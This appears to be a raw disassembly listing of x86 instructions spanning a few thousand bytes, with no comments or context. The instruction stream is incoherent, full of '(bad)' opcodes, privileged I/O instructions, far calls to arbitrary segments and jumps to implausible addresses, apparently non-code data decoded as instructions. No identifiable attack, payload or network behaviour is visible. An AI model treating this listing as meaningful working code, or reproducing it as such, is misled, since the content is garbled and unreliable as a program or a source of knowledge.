  48c350:	aas    
  48c351:	in     al,dx
  48c352:	dec    esi
  48c353:	mov    eax,ds:0x3bae1137
  48c358:	mov    al,BYTE PTR [eax-0x2de1835c]
  48c35e:	fstp   QWORD PTR ds:0x928a7280
  48c364:	mov    al,ds:0x5eb3016
  48c369:	xor    ch,BYTE PTR [ebx+0x3c3fc354]
  48c36f:	cmp    al,0xc3
  48c371:	test   al,0x5d
  48c373:	mul    BYTE PTR [ecx]
  48c375:	mov    esp,0x50e61019
  48c37a:	cmp    BYTE PTR [eax+0x68],cl
  48c37d:	mov    WORD PTR [ecx+0x3515c9d6],ss
  48c383:	add    BYTE PTR [ebx+0x14],ah
  48c386:	or     BYTE PTR [edx-0x43],dl
  48c389:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48c38a:	inc    ecx
  48c38b:	mov    ebp,DWORD PTR [ecx+eiz*2]
  48c38e:	dec    ecx
  48c38f:	loopne 0x48c311
  48c391:	push   edi
  48c392:	add    edx,edi
  48c394:	sub    al,0xe6
  48c396:	in     al,dx
  48c397:	sbb    DWORD PTR [edi],ebx
  48c399:	imul   eax,DWORD PTR [ecx+0x35],0x12
  48c39d:	arpl   WORD PTR [ebx+0x78563847],cx
  48c3a3:	arpl   ax,sp
  48c3a5:	daa    
  48c3a6:	xor    BYTE PTR [ecx],bl
  48c3a8:	sub    ah,BYTE PTR [esi]
  48c3aa:	rcl    BYTE PTR [ebp+0x4],0x45
  48c3ae:	cld    
  48c3af:	push   ecx
  48c3b0:	lods   al,BYTE PTR ds:[esi]
  48c3b1:	sbb    bh,BYTE PTR [ebp+edx*4+0xcd81730]
  48c3b8:	add    al,0x5d
  48c3ba:	push   ecx
  48c3bb:	cli    
  48c3bc:	inc    ebx
  48c3bd:	pop    es
  48c3be:	sti    
  48c3bf:	loopne 0x48c3d7
  48c3c1:	inc    eax
  48c3c2:	imul   edi,DWORD PTR [edi-0xd],0xffffffbb
  48c3c6:	adc    eax,0x8b153690
  48c3cb:	dec    eax
  48c3cc:	dec    ecx
  48c3cd:	push   0x75344a3b
  48c3d2:	or     dh,BYTE PTR ds:0x1b2b8580
  48c3d8:	pop    es
  48c3d9:	adc    BYTE PTR [esi],bh
  48c3db:	add    al,0xac
  48c3dd:	repz add al,0x38
  48c3e0:	ret    
  48c3e1:	xor    al,BYTE PTR ds:0x507185d7
  48c3e7:	aaa    
  48c3e8:	add    edx,DWORD PTR [esi]
  48c3ea:	dec    ecx
  48c3eb:	cmp    BYTE PTR [eax+0x58],dl
  48c3ee:	call   FWORD PTR [esi+0x6008a83e]
  48c3f4:	nop
  48c3f5:	ret    
  48c3f6:	aas    
  48c3f7:	stos   BYTE PTR es:[edi],al
  48c3f8:	dec    ecx
  48c3f9:	inc    esp
  48c3fa:	les    ecx,FWORD PTR [edx]
  48c3fc:	in     al,0x40
  48c3fe:	adc    BYTE PTR [ebp+0x31],cl
  48c401:	adc    dl,cl
  48c403:	xlat   BYTE PTR ds:[ebx]
  48c404:	rcr    BYTE PTR [esi-0x57],1
  48c407:	rol    BYTE PTR [ebx+0x3d],cl
  48c40a:	in     al,0xff
  48c40c:	dec    esi
  48c40d:	push   es
  48c40e:	cmp    eax,0xd9207fa6
  48c413:	sahf   
  48c414:	mov    esi,0x2be82040
  48c419:	je     0xc910e59
  48c41f:	ds add esi,edi
  48c422:	stos   DWORD PTR es:[edi],eax
  48c423:	imul   ebx,DWORD PTR [edx+0x3828271e],0x28
  48c42a:	ds retf 
  48c42c:	sub    eax,0xd8301217
  48c431:	mov    esi,0x284774db
  48c436:	or     BYTE PTR [edi+esi*2+0x40],dh
  48c43a:	pop    ebp
  48c43b:	add    al,0x2f
  48c43d:	sub    al,BYTE PTR [esi-0x1c]
  48c440:	popf   
  48c441:	add    dh,BYTE PTR [ebp-0x6e]
  48c444:	add    al,0x1e
  48c446:	adc    BYTE PTR [esi],0x8
  48c449:	jnp    0x48c451
  48c44b:	cmp    DWORD PTR [ebx+0x7a],ecx
  48c44e:	mov    al,0x22
  48c450:	sub    BYTE PTR [ebx-0x2fe752f4],dh
  48c456:	cmp    bh,al
  48c458:	loope  0x48c4c5
  48c45a:	pop    esp
  48c45b:	inc    esi
  48c45c:	sub    dh,BYTE PTR [edi+0x59446990]
  48c462:	loop   0x48c4c2
  48c464:	rol    edi,cl
  48c466:	pop    eax
  48c467:	xor    al,0xf6
  48c469:	inc    esi
  48c46a:	push   es
  48c46b:	test   BYTE PTR [edx+edx*1],al
  48c46e:	add    esp,edx
  48c470:	popf   
  48c471:	mov    eax,0x747c85c7
  48c476:	jl     0x48c410
  48c478:	add    DWORD PTR [ebp+0x20],esi
  48c47b:	dec    ebp
  48c47c:	sub    eax,0xdee558e8
  48c481:	test   BYTE PTR [edx+0x71],dl
  48c484:	add    edx,esp
  48c486:	add    dl,BYTE PTR [ebp-0x55beefc4]
  48c48c:	mov    WORD PTR [eax-0x258507af],ss
  48c492:	add    BYTE PTR [edi],cl
  48c494:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48c495:	loop   0x48c46e
  48c497:	mov    cl,BYTE PTR [ebp-0xd]
  48c49a:	add    eax,0xdb1bc9f1
  48c49f:	leave  
  48c4a0:	hlt    
  48c4a1:	iret   
  48c4a2:	(bad)  
  48c4a3:	mov    al,ds:0x8d22b5be
  48c4a8:	xchg   DWORD PTR [esi],ebp
  48c4aa:	add    cl,ch
  48c4ac:	test   al,0x83
  48c4ae:	inc    edi
  48c4af:	or     eax,0xfe59eab1
  48c4b4:	rcl    BYTE PTR [ecx],0xc7
  48c4b7:	adc    al,0xdb
  48c4b9:	inc    ecx
  48c4ba:	in     eax,0x22
  48c4bc:	(bad)
  48c4c0:	retf   
  48c4c1:	mov    esp,0xfa701102
  48c4c6:	adc    BYTE PTR [ebp+0x6fa20381],dh
  48c4cc:	mov    WORD PTR [eax+0x3be05519],ss
  48c4d2:	inc    edx
  48c4d3:	or     al,0x24
  48c4d5:	call   0xf428:0x2d6b1aeb
  48c4dc:	int3   
  48c4dd:	and    esi,DWORD PTR [eax+0x39]
  48c4e0:	inc    esp
  48c4e1:	fadd   DWORD PTR [esi-0x5c]
  48c4e4:	inc    eax
  48c4e5:	bound  esp,QWORD PTR [edi-0x5dccd4e8]
  48c4eb:	nop
  48c4ec:	inc    edi
  48c4ed:	push   0x8646a63
  48c4f2:	mov    eax,0x28bf7d2a
  48c4f7:	cmp    al,0x52
  48c4f9:	sub    eax,0x668bdbb8
  48c4fe:	jae    0x48c483
  48c500:	push   0xffffffde
  48c502:	push   edx
  48c503:	pop    esi
  48c504:	mov    BYTE PTR [esi],al
  48c506:	add    esi,ebp
  48c508:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48c509:	icebp  
  48c50a:	jge    0x48c566
  48c50c:	or     esp,DWORD PTR [ecx+0xda7822b]
  48c512:	adc    bl,BYTE PTR [eax+0x5d]
  48c515:	fcom   QWORD PTR [edi]
  48c517:	test   BYTE PTR [edx-0x11f707d8],0xd
  48c51e:	or     al,0xe0
  48c520:	and    cl,BYTE PTR [ebp-0x38]
  48c523:	test   eax,0x96c2f892
  48c528:	pop    es
  48c529:	lock sti 
  48c52b:	mov    esp,0x1a342533
  48c530:	scas   al,BYTE PTR es:[edi]
  48c531:	and    BYTE PTR [ebp+0x17],ch
  48c534:	inc    ebx
  48c535:	add    eax,DWORD PTR [edx-0x239b437b]
  48c53b:	jg     0x48c53f
  48c53d:	xor    bl,BYTE PTR [ebx+ebp*1+0x8dc9a58]
  48c544:	mov    cl,0xc2
  48c546:	cmp    cl,BYTE PTR ss:[eax]
  48c549:	dec    eax
  48c54a:	xor    ebp,esp
  48c54c:	div    DWORD PTR [edx]
  48c54e:	dec    ebp
  48c54f:	mov    ah,0xa2
  48c551:	mov    DWORD PTR [ecx-0x24],ecx
  48c554:	ss add ebp,ecx
  48c557:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48c558:	adc    cl,0xe8
  48c55b:	cmp    DWORD PTR ds:0xd6f116b1,edx
  48c561:	push   eax
  48c562:	sbb    dh,bl
  48c564:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48c565:	popf   
  48c566:	cdq    
  48c567:	and    DWORD PTR [eax-0x35d67771],esp
  48c56d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48c56e:	cli    
  48c56f:	jge    0x48c54b
  48c571:	ret    0x8244
  48c574:	push   eax
  48c575:	push   cs
  48c576:	lea    ecx,[eax+0x1c]
  48c579:	cdq    
  48c57a:	and    BYTE PTR [esi+0x1941ad91],al
  48c580:	fucomi st,st(2)
  48c582:	mov    ss,WORD PTR [ecx+0x1c]
  48c585:	pushf  
  48c586:	pop    edx
  48c587:	mov    DWORD PTR [eax-0x15b894f7],edi
  48c58d:	out    0xd7,eax
  48c58f:	fiadd  WORD PTR [edx-0xe]
  48c592:	push   eax
  48c593:	(bad)  [edi-0x17]
  48c596:	dec    esi
  48c597:	inc    esp
  48c598:	pop    esi
  48c599:	jb     0x48c5bb
  48c59b:	sbb    eax,0x74d81215
  48c5a0:	add    DWORD PTR [edx],eax
  48c5a2:	scas   al,BYTE PTR es:[edi]
  48c5a3:	in     al,0x48
  48c5a5:	fdivr  st,st(2)
  48c5a7:	mov    edx,0x79ddc680
  48c5ac:	adc    BYTE PTR [ebp-0x79e5431c],bl
  48c5b2:	mov    ah,0x63
  48c5b4:	jne    0x48c605
  48c5b6:	push   eax
  48c5b7:	dec    esi
  48c5b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48c5b9:	sbb    eax,0x49e4930c
  48c5be:	xor    esi,DWORD PTR [ebx]
  48c5c0:	push   ebp
  48c5c1:	in     al,0x52
  48c5c3:	add    al,0x16
  48c5c5:	or     eax,0xa6911b43
  48c5ca:	xor    DWORD PTR [esi],0x41
  48c5cd:	fmul   DWORD PTR [esp+edx*4]
  48c5d0:	cmp    al,0x6
  48c5d2:	arpl   di,di
  48c5d4:	inc    ecx
  48c5d5:	cmp    cl,BYTE PTR [esi-0x37]
  48c5d8:	and    DWORD PTR [edi],eax
  48c5da:	ret    
  48c5db:	in     al,0x3b
  48c5dd:	loope  0x48c636
  48c5df:	adc    al,0xd8
  48c5e1:	bound  ebx,QWORD PTR [eax+0x75]
  48c5e4:	je     0x48c5b1
  48c5e6:	mov    edx,0x5ce1b95a
  48c5eb:	add    BYTE PTR [ebp+0x54fedae8],al
  48c5f1:	dec    ecx
  48c5f2:	ins    DWORD PTR es:[edi],dx
  48c5f3:	or     al,0x86
  48c5f5:	test   eax,0x5c6b3ebd
  48c5fa:	retf   0x805
  48c5fd:	bound  ecx,QWORD PTR [edi+ebp*2-0x16]
  48c601:	dec    esi
  48c602:	fnsave [edx]
  48c604:	les    ecx,FWORD PTR [edx+0x56]
  48c607:	add    al,0x22
  48c609:	clc    
  48c60a:	fidiv  WORD PTR [esi]
  48c60c:	push   esi
  48c60d:	add    esi,DWORD PTR [esi-0x2db6cae5]
  48c613:	xchg   ebp,eax
  48c614:	inc    edx
  48c615:	push   ds
  48c616:	push   eax
  48c617:	lds    eax,FWORD PTR [edx+0x41]
  48c61a:	(bad)  
  48c61b:	lods   eax,DWORD PTR ds:[esi]
  48c61c:	int    0xe3
  48c61e:	pop    eax
  48c61f:	enter  0xcd42,0x43
  48c623:	sub    eax,0x4f064f19
  48c628:	inc    esp
  48c629:	shl    BYTE PTR [eax-0x70dfb778],1
  48c62f:	mov    al,ds:0x8604dfc0
  48c634:	push   ebx
  48c635:	push   0x12681e80
  48c63a:	(bad)  
  48c63b:	sbb    edx,DWORD PTR es:[ecx]
  48c63e:	dec    edi
  48c63f:	add    al,ah
  48c641:	xor    eax,0x40ef0ac3
  48c646:	sub    eax,0x57f03237
  48c64b:	add    al,0x85
  48c64d:	out    dx,al
  48c64e:	add    eax,0xb6dc5170
  48c653:	les    edi,FWORD PTR [edi+0x2a04df22]
  48c659:	mov    al,ds:0x315846c7
  48c65e:	inc    esi
  48c65f:	pop    esp
  48c660:	or     al,0x84
  48c662:	sbb    esi,DWORD PTR [ebp-0x6]
  48c665:	mov    DWORD PTR [eax-0x5e49674],esi
  48c66b:	mov    ds:0xa73c383a,al
  48c670:	mov    bh,dl
  48c672:	xor    BYTE PTR [ecx+0x6d],0x68
  48c676:	cmp    dh,al
  48c678:	inc    esi
  48c679:	popa   
  48c67a:	add    DWORD PTR [eax-0x635a1eb8],ebp
  48c680:	xor    al,0x3f
  48c682:	or     al,0x77
  48c684:	or     BYTE PTR [eax+0x34610369],al
  48c68a:	pop    es
  48c68b:	loopne 0x48c6a8
  48c68d:	and    DWORD PTR [ecx+0x4],edi
  48c690:	sub    edi,DWORD PTR [esi+esi*8]
  48c693:	jb     0x48c6d7
  48c695:	loopne 0x48c6b2
  48c697:	push   cs
  48c698:	mov    dh,0xe
  48c69a:	je     0x48c718
  48c69c:	dec    esp
  48c69d:	or     DWORD PTR [esi+0x404770a],edx
  48c6a3:	sbb    bl,BYTE PTR [edi+ecx*2+0x50890ef6]
  48c6aa:	into   
  48c6ab:	xchg   ebp,eax
  48c6ac:	push   es
  48c6ad:	or     ch,BYTE PTR [ebp+0x31ff3770]
  48c6b3:	sub    ch,BYTE PTR [edx]
  48c6b5:	sbb    al,0xb0
  48c6b7:	or     ah,dh
  48c6b9:	in     eax,dx
  48c6ba:	clc    
  48c6bb:	cli    
  48c6bc:	std    
  48c6bd:	xchg   esi,eax
  48c6be:	mov    ah,0x5
  48c6c0:	por    mm2,QWORD PTR ds:0xcf342c7d
  48c6c7:	div    DWORD PTR [eax]
  48c6c9:	and    BYTE PTR [esi+0x79910d04],dl
  48c6cf:	ss mov al,0x74
  48c6d2:	enter  0x80cf,0x78
  48c6d6:	sub    DWORD PTR [ebx+0x6810dc0],eax
  48c6dc:	sbb    DWORD PTR [ecx-0x77e85d4d],esp
  48c6e2:	outs   dx,BYTE PTR ds:[esi]
  48c6e3:	mov    esp,0x44e60947
  48c6e8:	push   ds
  48c6e9:	pop    es
  48c6ea:	jb     0x48c6ed
  48c6ec:	and    edx,DWORD PTR [esp+eax*4+0x17c2982e]
  48c6f3:	mov    ah,0x1e
  48c6f5:	inc    edi
  48c6f6:	sub    BYTE PTR [ecx-0x34],bl
  48c6f9:	pop    esp
  48c6fa:	ret    0x8403
  48c6fd:	pushf  
  48c6fe:	popa   
  48c6ff:	adc    bl,BYTE PTR [eax-0x30]
  48c702:	push   ds
  48c703:	call   0x40a9f409
  48c708:	es ror ecx,cl
  48c70b:	or     ch,BYTE PTR [edx]
  48c70d:	mov    cl,0x7b
  48c70f:	dec    esi
  48c710:	inc    ebx
  48c711:	xor    al,0x42
  48c713:	cmp    ax,0x43e5
  48c717:	xor    al,0xf
  48c719:	fimul  DWORD PTR [ebx+0x1d966860]
  48c71f:	gs fs stc 
  48c722:	push   0xffffffd7
  48c724:	inc    esp
  48c725:	aam    0x45
  48c727:	js     0x48c6b8
  48c729:	pusha  
  48c72a:	call   0x23fd:0xfbbe502c
  48c731:	mov    eax,0x2c0b6668
  48c736:	inc    ebp
  48c737:	test   BYTE PTR [edx],ch
  48c739:	movzx  ebp,bp
  48c73c:	pop    ds
  48c73d:	imul   eax,ecx,0x870b0ae0
  48c743:	ret    
  48c744:	leave  
  48c745:	and    BYTE PTR [esi],dl
  48c747:	(bad)  
  48c749:	cmc    
  48c74a:	pop    esi
  48c74b:	inc    ecx
  48c74c:	test   dh,dh
  48c74e:	push   ebp
  48c74f:	mov    ebp,DWORD PTR [ebx+0x13013c4]
  48c755:	pop    ds
  48c756:	clc    
  48c757:	pop    ecx
  48c758:	retf   0x74c8
  48c75b:	xchg   edx,eax
  48c75c:	ja     0x48c762
  48c75e:	and    ecx,DWORD PTR [ebx]
  48c760:	imul   ecx,DWORD PTR [esi-0x21d7fb6d],0x935441b
  48c76a:	sub    ebx,DWORD PTR [esi]
  48c76c:	cmp    al,0xe0
  48c76e:	jae    0x48c792
  48c770:	arpl   WORD PTR [edx],di
  48c772:	push   edi
  48c773:	call   0x45eeb307
  48c778:	xchg   BYTE PTR [ebx],ah
  48c77a:	and    BYTE PTR [ebx+0x4d],al
  48c77d:	popa   
  48c77e:	pop    edi
  48c77f:	nop
  48c780:	adc    ch,ch
  48c782:	dec    esp
  48c783:	arpl   WORD PTR [ebx+0x1e598356],dx
  48c789:	test   BYTE PTR [ebp-0x4b],0x82
  48c78d:	push   ecx
  48c78e:	dec    ebp
  48c78f:	mov    esi,0x360aa72c
  48c794:	jo     0x48c7b9
  48c796:	lock or esp,DWORD PTR [eax]
  48c799:	push   cs
  48c79a:	sbb    al,0xba
  48c79c:	or     eax,0x453bc6df
  48c7a1:	daa    
  48c7a2:	mov    edx,0x697f190e
  48c7a7:	fist   WORD PTR [ecx]
  48c7a9:	(bad)  
  48c7aa:	jmp    0x48c7ec
  48c7ac:	scas   al,BYTE PTR es:[edi]
  48c7ad:	push   0xffffff80
  48c7af:	je     0x48c7fb
  48c7b1:	add    al,0x13
  48c7b3:	sbb    edx,DWORD PTR [eax+0x371a1101]
  48c7b9:	pop    es
  48c7ba:	or     al,0x3b
  48c7bc:	(bad)  
  48c7bd:	and    eax,0xf28a5666
  48c7c2:	lea    eax,[esi]
  48c7c4:	scas   al,BYTE PTR es:[edi]
  48c7c5:	mov    dl,BYTE PTR [esi-0x73c03a15]
  48c7cb:	push   edx
  48c7cc:	pop    eax
  48c7cd:	mov    al,ds:0xd082ef9f
  48c7d2:	mov    bh,0x25
  48c7d4:	push   ebp
  48c7d5:	jnp    0x48c7df
  48c7d7:	pop    esi
  48c7d8:	cmc    
  48c7d9:	lds    esi,FWORD PTR [eax-0x6a]
  48c7dc:	mov    bl,BYTE PTR [eax+edi*1-0x1]
  48c7e0:	mov    dl,0x78
  48c7e2:	xor    BYTE PTR [ecx],cl
  48c7e4:	add    BYTE PTR [ebx+0x6638a504],ch
  48c7ea:	loopne 0x48c84b
  48c7ec:	push   ds
  48c7ed:	inc    edi
  48c7ee:	jmp    0x48c844
  48c7f0:	cmp    bl,0x26
  48c7f3:	jne    0x48c844
  48c7f5:	push   ebx
  48c7f6:	ss push esp
  48c7f8:	ret    0x110a
  48c7fb:	jmp    0x3678:0x6655317e
  48c802:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48c803:	pop    eax
  48c804:	add    cl,dl
  48c806:	sbb    dl,BYTE PTR [eax-0x8]
  48c809:	xlat   BYTE PTR ds:[ebx]
  48c80a:	lock cmp BYTE PTR [eax+edi*1-0x2],0xba
  48c810:	sbb    dl,BYTE PTR [ecx]
  48c812:	add    DWORD PTR [ecx],ebp
  48c814:	jne    0x48c827
  48c816:	test   DWORD PTR [edx+0x6b],0x4b9e763
  48c81d:	(bad)  
  48c81e:	jmp    0x48c82e
  48c820:	sbb    cl,BYTE PTR [eax-0x2c8cc128]
  48c826:	cs pop ds
  48c828:	inc    edi
  48c829:	jg     0x48c7ae
  48c82b:	nop
  48c82c:	xor    dh,BYTE PTR [esi-0x3e]
  48c82f:	test   DWORD PTR [edi+0x77],ebx
  48c832:	call   0xbb69:0xc5afde86
  48c839:	pop    ecx
  48c83a:	pop    es
  48c83b:	adc    eax,0x4a47b416
  48c840:	cmp    eax,0x4d570837
  48c845:	inc    ecx
  48c846:	dec    edi
  48c847:	adc    BYTE PTR [edx],bl
  48c849:	(bad)  
  48c84a:	mov    ecx,0xf021003d
  48c84f:	push   ds
  48c850:	jmp    DWORD PTR [esi]
  48c852:	mov    eax,ds:0x44bde242
  48c857:	dec    eax
  48c858:	jl     0x48c86d
  48c85a:	inc    ebx
  48c85b:	sbb    eax,0xb62bc5d0
  48c860:	popa   
  48c861:	push   es
  48c862:	push   edi
  48c863:	inc    ebx
  48c864:	js     0x48c8e3
  48c866:	ret    
  48c867:	(bad)  
  48c868:	jns    0x48c8bf
  48c86a:	aam    0x48
  48c86c:	data16 sti 
  48c86e:	loope  0x48c8c3
  48c870:	adc    BYTE PTR [edx+0x8],bh
  48c873:	or     DWORD PTR [esi],ecx
  48c875:	not    al
  48c877:	ins    DWORD PTR es:[edi],dx
  48c878:	es jne 0x48c83e
  48c87b:	sbb    edi,eax
  48c87d:	lods   eax,DWORD PTR ds:[esi]
  48c87e:	cwde   
  48c87f:	mov    edx,DWORD PTR [esi]
  48c881:	enter  0xb4a3,0x8b
  48c885:	call   0x8d2631dd
  48c88a:	mov    ds:0xf93012a3,al
  48c88f:	sahf   
  48c890:	div    ecx
  48c892:	jb     0x48c8f4
  48c894:	(bad)  
  48c895:	lock push cs
  48c897:	and    al,0xec
  48c899:	push   ds
  48c89a:	loopne 0x48c90b
  48c89c:	fidivr WORD PTR [ebp-0x62]
  48c89f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48c8a0:	call   0x72fdacb1
  48c8a5:	es dec esi
  48c8a7:	adc    al,0x7b
  48c8a9:	dec    edx
  48c8aa:	repz jns 0x48c889
  48c8ad:	fs jno 0x48c888
  48c8b0:	push   ds
  48c8b1:	aam    0xe
  48c8b3:	iret   
  48c8b4:	jnp    0x48c854
  48c8b6:	out    0x34,al
  48c8b8:	jae    0x48c88a
  48c8ba:	xor    ah,cl
  48c8bc:	outs   dx,BYTE PTR ds:[esi]
  48c8bd:	pushf  
  48c8be:	enter  0x9ef3,0xf7
  48c8c2:	cmp    al,0xf4
  48c8c4:	les    ecx,FWORD PTR [esi]
  48c8c6:	mov    esp,0xdc744ec0
  48c8cb:	repz cmp al,0xcf
  48c8ce:	mov    esp,0xb4acb84c
  48c8d3:	aas    
  48c8d4:	sub    DWORD PTR [eax],ecx
  48c8d6:	pushf  
  48c8d7:	repnz pop esi
  48c8d9:	mov    al,0xe
  48c8db:	fistp  QWORD PTR [esi-0x171be64b]
  48c8e1:	push   esp
  48c8e2:	inc    esp
  48c8e3:	cmp    al,0x75
  48c8e5:	cmp    eax,0xc7639043
  48c8ea:	push   ss
  48c8eb:	jne    0x48c900
  48c8ed:	inc    eax
  48c8ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48c8ef:	mov    esi,DWORD PTR [esi]
  48c8f1:	ins    BYTE PTR es:[edi],dx
  48c8f2:	mov    eax,0xb7124c7e
  48c8f7:	cmc    
  48c8f8:	and    eax,0x5157ef24
  48c8fd:	call   0xbef7:0xaeef5dc0
  48c904:	adc    eax,DWORD PTR [edx+0x7b5cbc2e]
  48c90a:	mov    eax,0x4e4453f0
  48c90f:	jno    0x48c96a
  48c911:	pop    eax
  48c912:	ins    DWORD PTR es:[edi],dx
  48c913:	pop    eax
  48c914:	repnz inc ebp
  48c916:	push   ds
  48c917:	or     al,0x12
  48c919:	sti    
  48c91a:	jl     0x48c912
  48c91c:	ror    BYTE PTR [ebp+0x0],cl
  48c91f:	xchg   DWORD PTR [ebx],esi
  48c921:	sub    al,bh
  48c923:	push   0x33f272d0
  48c928:	or     BYTE PTR [edi],bh
  48c92a:	and    al,bh
  48c92c:	cld    
  48c92d:	inc    ebx
  48c92e:	xor    al,0x9
  48c930:	cmp    BYTE PTR [edi+0x39],bl
  48c933:	fs std 
  48c935:	add    dl,BYTE PTR [edi]
  48c937:	les    esp,FWORD PTR [ebx-0x1ed2e7c8]
  48c93d:	(bad)  
  48c93e:	xlat   BYTE PTR ds:[ebx]
  48c93f:	push   ebp
  48c940:	cli    
  48c941:	add    DWORD PTR ds:0x8037754,ecx
  48c947:	js     0x48c9c5
  48c949:	dec    ecx
  48c94a:	outs   dx,BYTE PTR ds:[esi]
  48c94b:	arpl   WORD PTR [ebx],ax
  48c94d:	mov    bh,0xde
  48c94f:	adc    cl,BYTE PTR [ecx+0x369cdf24]
  48c955:	add    ecx,DWORD PTR [edi]
  48c957:	mov    dl,0xf1
  48c959:	call   0x93a:0x980267e3
  48c960:	imul   bp,bp,0x15
  48c964:	mov    al,ds:0x6c756765
  48c969:	ss push es
  48c96b:	adc    al,BYTE PTR [esi+0xc]
  48c96e:	je     0x48c97a
  48c970:	inc    edi
  48c971:	add    BYTE PTR [esi+0x0],cl
  48c974:	lock push ebp
  48c976:	sub    al,0x18
  48c978:	or     DWORD PTR [ecx+0x5],esp
  48c97b:	inc    esi
  48c97c:	sahf   
  48c97d:	bound  eax,QWORD PTR [ebx]
  48c97f:	xor    esi,DWORD PTR [ebx]
  48c981:	fimul  WORD PTR [edx+0x1]
  48c984:	dec    esp
  48c985:	pop    ds
  48c986:	mov    ds:0x34e78912,al
  48c98b:	dec    eax
  48c98c:	out    dx,eax
  48c98d:	dec    esi
  48c98e:	or     ch,BYTE PTR [eax+0x27]
  48c991:	xor    BYTE PTR [ecx+0x66],bh
  48c994:	adc    DWORD PTR ds:0xc11a675a,ecx
  48c99a:	cmp    eax,DWORD PTR [esi-0x49]
  48c99d:	pop    es
  48c99e:	xor    DWORD PTR [esi+ebp*4],eax
  48c9a1:	imul   edx,DWORD PTR [eax-0x534367fb],0x25
  48c9a8:	ins    BYTE PTR es:[edi],dx
  48c9a9:	cmp    al,BYTE PTR [ecx]
  48c9ab:	mov    ah,0xe
  48c9ad:	cmp    al,0x64
  48c9af:	and    al,0x18
  48c9b1:	sbb    BYTE PTR [ebp+0x2],0xe8
  48c9b5:	xchg   esi,eax
  48c9b6:	add    DWORD PTR [edx],ecx
  48c9b8:	rol    DWORD PTR [ebx],0x21
  48c9bb:	mov    WORD PTR [esi+esi*1],gs
  48c9be:	enter  0x4278,0x4b
  48c9c2:	fisubr WORD PTR [eax]
  48c9c4:	dec    eax
  48c9c5:	pop    esp
  48c9c6:	clc    
  48c9c7:	out    dx,al
  48c9c8:	loopne 0x48c9f0
  48c9ca:	xchg   ecx,eax
  48c9cb:	inc    edi
  48c9cc:	jl     0x48c9cc
  48c9ce:	or     BYTE PTR [esi],bl
  48c9d0:	loope  0x48ca15
  48c9d2:	aaa    
  48c9d3:	call   0x3f6af1df
  48c9d8:	or     BYTE PTR [edi],dh
  48c9da:	or     eax,eax
  48c9dc:	mov    ebx,0x7288f006
  48c9e1:	gs inc esi
  48c9e3:	push   0x86121ad0
  48c9e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48c9e9:	sbb    cl,BYTE PTR [esi-0x4369f9e6]
  48c9ef:	not    DWORD PTR [eax+0x2c4000b1]
  48c9f5:	enter  0x478,0x6a
  48c9f9:	inc    ecx
  48c9fa:	call   0x82fbce0e
  48c9ff:	or     edi,DWORD PTR [ecx+0x1a]
  48ca02:	pop    edi
  48ca03:	or     al,0x90
  48ca05:	add    eax,0x48dba700
  48ca0a:	or     DWORD PTR [edi+0x76091045],esp
  48ca10:	enter  0xe0cd,0x81
  48ca14:	hlt    
  48ca15:	add    DWORD PTR [esi+eax*1+0x48],0x6c7073c8
  48ca1d:	adc    eax,0xd31f1f12
  48ca22:	push   ebp
  48ca23:	fcomp  QWORD PTR [edi+eax*1+0x53]
  48ca27:	ins    DWORD PTR es:[edi],dx
  48ca28:	outs   dx,DWORD PTR ds:[esi]
  48ca29:	fs push 0x45c33081
  48ca2f:	or     eax,0x6b8154e0
  48ca34:	add    al,0x1b
  48ca36:	jno    0x48ca59
  48ca38:	scas   eax,DWORD PTR es:[edi]
  48ca39:	test   ebx,ebx
  48ca3b:	xor    al,0x3c
  48ca3d:	cwde   
  48ca3e:	or     DWORD PTR [eax+0x63224537],edx
  48ca44:	cmp    BYTE PTR [esi],bh
  48ca46:	mov    al,0xe7
  48ca48:	sar    DWORD PTR [ebp-0x45],0xa
  48ca4c:	inc    edx
  48ca4d:	push   esp
  48ca4e:	push   0x86626d75
  48ca53:	pop    es
  48ca54:	sbb    eax,0x90bb0f88
  48ca59:	sbb    eax,0xcd63c80b
  48ca5e:	xor    eax,0x50ae1300
  48ca63:	sbb    al,0x0
  48ca65:	in     eax,dx
  48ca66:	adc    al,0xb0
  48ca68:	nop
  48ca69:	sbb    BYTE PTR [edi+0x1e8f0b6f],0x66
  48ca70:	xor    al,0x58
  48ca72:	cs or  al,0x54
  48ca75:	pop    ss
  48ca76:	out    dx,eax
  48ca77:	and    BYTE PTR [ecx+eax*4],al
  48ca7a:	inc    ebx
  48ca7b:	xor    BYTE PTR [eax+ecx*1],dh
  48ca7e:	(bad)  
  48ca7f:	push   edx
  48ca80:	adc    eax,edx
  48ca82:	ja     0x48caf7
  48ca84:	xchg   ebp,eax
  48ca85:	adc    BYTE PTR [ebp+0x46],cl
  48ca88:	in     al,0x88
  48ca8a:	in     al,dx
  48ca8b:	fisubr WORD PTR [ecx+0x6d]
  48ca8e:	hlt    
  48ca8f:	fs pop ss
  48ca91:	popa   
  48ca92:	js     0x48caa1
  48ca94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48ca95:	sbb    eax,0xc45e75d8
  48ca9a:	pop    eax
  48ca9b:	add    eax,ebx
  48ca9d:	pop    ecx
  48ca9e:	pop    ds
  48ca9f:	cwde   
  48caa0:	jmp    0x6be:0x16f78412
  48caa7:	sbb    al,0x6f
  48caa9:	adc    BYTE PTR [edi],dl
  48caab:	add    eax,0x8f4484bc
  48cab0:	cld    
  48cab1:	add    eax,DWORD PTR [ebp+0x44842c3c]
  48cab7:	pop    esp
  48cab8:	mov    eax,DWORD PTR [eax+eax*1+0x30]
  48cabc:	test   DWORD PTR [ebx+eax*1+0x20],eax
  48cac0:	push   edi
  48cac1:	scas   al,BYTE PTR es:[edi]
  48cac2:	loopne 0x48ca48
  48cac4:	inc    esp
  48cac5:	lock test BYTE PTR [eax+edx*2+0x2],al
  48caca:	cmp    al,0x5e
  48cacc:	je     0x48cb3d
  48cace:	mov    dh,dl
  48cad0:	mov    al,BYTE PTR [edi+esi*2+0x15]
  48cad4:	add    eax,0x3c678bdc
